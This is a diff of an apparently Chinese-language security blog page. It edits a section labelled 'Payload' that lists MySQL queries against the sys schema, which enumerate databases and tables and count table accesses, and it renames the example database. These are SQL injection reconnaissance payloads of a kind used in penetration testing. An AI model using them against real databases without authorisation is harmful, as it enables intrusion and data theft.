@@ -139,14 +139,14 @@
      
      2.数据库用户为root@localohost用户
 </code></pre>
-<p><strong>Payload:</strong><br>
-<strong>查询所有的库：</strong></p>
+<p><strong>Payload:</strong></p>
+<p><strong>查询所有的库：</strong></p>
 <pre><code class="language-SQL">SELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;
 SELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;
 </code></pre>
 <p><strong>查询指定库的表（若无则说明此表从未被访问）：</strong></p>
-<pre><code class="language-SQL">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;
-SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;
+<pre><code class="language-SQL">SELECT table_name FROM sys.schema_table_statistics WHERE table_schema='loecho' GROUP BY table_name;
+SELECT table_name FROM  sys.x$schema_flattened_keys WHERE table_schema='loecho' GROUP BY table_name;
 </code></pre>
 <p><strong>统计所有访问过的表次数:库名,表名,访问次数</strong></p>
 <pre><code class="language-SQL">select table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by table_schema,table_name order by io desc;
